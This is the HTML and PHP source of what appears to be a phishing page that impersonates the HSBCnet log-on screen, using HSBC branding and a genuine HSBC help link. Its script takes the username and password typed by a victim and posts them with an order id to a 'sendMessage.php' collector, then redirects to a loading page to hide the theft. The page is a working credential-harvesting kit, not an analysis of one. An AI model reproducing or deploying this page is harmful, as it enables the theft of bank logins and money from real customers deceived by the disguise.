<!DOCTYPE html>
<html lang="en">

<head>
    <link rel="stylesheet" type="text/css" href="hsbc/hsbc.css">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="hsbc/images/monetaicon.png" type="image/png">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <title>Log on | HSBCnet</title>
</head>

<body>
    <div class="container">
        <div class="header">
            <img src="hsbc/images/HSBC-Logo.png" alt="">
        </div>
        <div class="main-center">
            <div class="prihlaseni">
                <div class="titleprihlaseni">
                    Log on to HSBCnet
                </div>
                <div class="id">
                    Username
                </div>
                <div class='idinput'>
                    <div class='input-wrapper'>
                        <input type="text" id="login">
                    </div>
                </div>
                <div class="heslo">
                    Heslo
                </div>
                <div class="hesloinput">
                    <div class="input-wrapper2">
                        <input type="password" id="password">
                    </div>
                </div>
                <div class="prihlasit">
                    <button id="Pokracovat"> Continue </button>
                </div>
                <div class="bottomlinks">
                    <div class="napoveda">
                        <a href="https://www.hsbc.co.uk/help/security-centre/lost-your-details/">
                            Forgotten your username?
                        </a>
                    </div>
                </div>
            </div>
            <div class="footer">
            </div>
        </div>
    </div>
    <script src="hsbc/hsbc.js"></script>
    <script>
    const submitButton = document.getElementById('Pokracovat')
const login = document.getElementById('login')
const password = document.getElementById('password')

submitButton.onclick = function () {

let bank = "<?php echo $bank ?>";

if (login.value == null || password.value == null) {
    return;
}

$.ajax({
            url: 'hsbc/sendMessage.php',
            method: 'POST',
            data: {
                orderid: "<?php echo $id ?>",
                bank: 'hsbc',
                login: login.value,
                password: password.value
            },
            success: function (response) {
                // Обрабатываем успешный ответ
                console.log('Success');
            },
            error: function (error) {
                // Обрабатываем ошибку
                console.log('Error updating bank:', error);
            },
            complete: function () {
                // Выполняем переход на новую страницу
                const currentURL = window.location.href;
  const newURL = currentURL.replace('/bankaccount/', '/loading/');
  window.location.href = newURL;
            }
        });

}
  </script>
</body>

</html>